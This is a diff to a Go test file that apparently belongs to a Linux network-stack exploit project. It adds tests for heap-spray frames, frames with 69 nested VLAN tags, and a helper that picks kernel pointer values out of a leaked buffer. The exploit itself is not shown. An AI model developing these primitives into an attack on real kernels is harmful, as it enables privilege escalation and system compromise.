@@ -36,7 +36,7 @@ func TestEgressDoubleVLANFrame(t *testing.T) {
 	dstMAC, _ := net.ParseMAC("02:00:00:00:00:02")
 	ip := egressFragment(0, true, bytesRepeat(8, marker), ipID,
 		net.ParseIP("192.0.2.2"), net.ParseIP("198.51.100.7"))
-	frame := egressFrame(ip, srcMAC, dstMAC)
+	frame := egressFrame(ip, srcMAC, dstMAC, 2)
 	if got := binary.BigEndian.Uint16(frame[12:]); got != vlanProto {
 		t.Fatalf("outer ethertype = %#04x", got)
 	}
@@ -48,6 +48,23 @@ func TestEgressDoubleVLANFrame(t *testing.T) {
 	}
 	if frame[l2Len] != 0x45 {
 		t.Fatalf("IPv4 starts at %d with %#02x", l2Len, frame[l2Len])
+	}
+}
+
+func TestEgressSprayFrame(t *testing.T) {
+	src, _ := net.ParseMAC("02:00:00:00:00:01")
+	dst, _ := net.ParseMAC("02:00:00:00:00:02")
+	frame := egressSprayFrame(src, dst, 0xee)
+	if len(frame) != egressSprayLen {
+		t.Fatalf("spray frame length = %d, want %d", len(frame), egressSprayLen)
+	}
+	if got := binary.BigEndian.Uint16(frame[12:14]); got != ethPExperiment {
+		t.Fatalf("spray ethertype = %#04x, want %#04x", got, ethPExperiment)
+	}
+	for i, b := range frame[ethLen:] {
+		if b != 0xee {
+			t.Fatalf("spray payload byte %d = %#02x, want 0xee", i, b)
+		}
 	}
 }
 
@@ -63,9 +80,33 @@ func TestIPv4OfDoubleVLANFrame(t *testing.T) {
 	dstMAC, _ := net.ParseMAC("02:00:00:00:00:02")
 	want := egressFragment(0, true, bytesRepeat(8, marker), ipID,
 		net.ParseIP("192.0.2.2"), net.ParseIP("198.51.100.7"))
-	got := ipv4Of(egressFrame(want, srcMAC, dstMAC))
+	got := ipv4Of(egressFrame(want, srcMAC, dstMAC, 2))
 	if len(got) != len(want) || string(got) != string(want) {
 		t.Fatalf("decoded IPv4 packet differs: got %x want %x", got, want)
+	}
+}
+
+func TestDeepVLANFrame(t *testing.T) {
+	srcMAC, _ := net.ParseMAC("02:00:00:00:00:01")
+	dstMAC, _ := net.ParseMAC("02:00:00:00:00:02")
+	want := egressFragment(0, true, bytesRepeat(8, marker), ipID,
+		net.ParseIP("192.0.2.2"), net.ParseIP("198.51.100.7"))
+	frame := egressFrame(want, srcMAC, dstMAC, 69)
+	if got := len(frame); got != ethLen+69*vlanLen+len(want) {
+		t.Fatalf("deep VLAN frame length = %d", got)
+	}
+	got := ipv4Of(frame)
+	if len(got) != len(want) || string(got) != string(want) {
+		t.Fatalf("decoded deep-VLAN IPv4 packet differs: got %x want %x", got, want)
+	}
+}
+
+func TestKernelPointerCandidates(t *testing.T) {
+	leak := make([]byte, 32)
+	binary.LittleEndian.PutUint64(leak[10:18], 0xffff947485f7c500)
+	got := kernelPointerCandidates(leak)
+	if len(got) != 1 || got[0].offset != 10 || got[0].value != 0xffff947485f7c500 {
+		t.Fatalf("pointer candidates = %#v", got)
 	}
 }
 
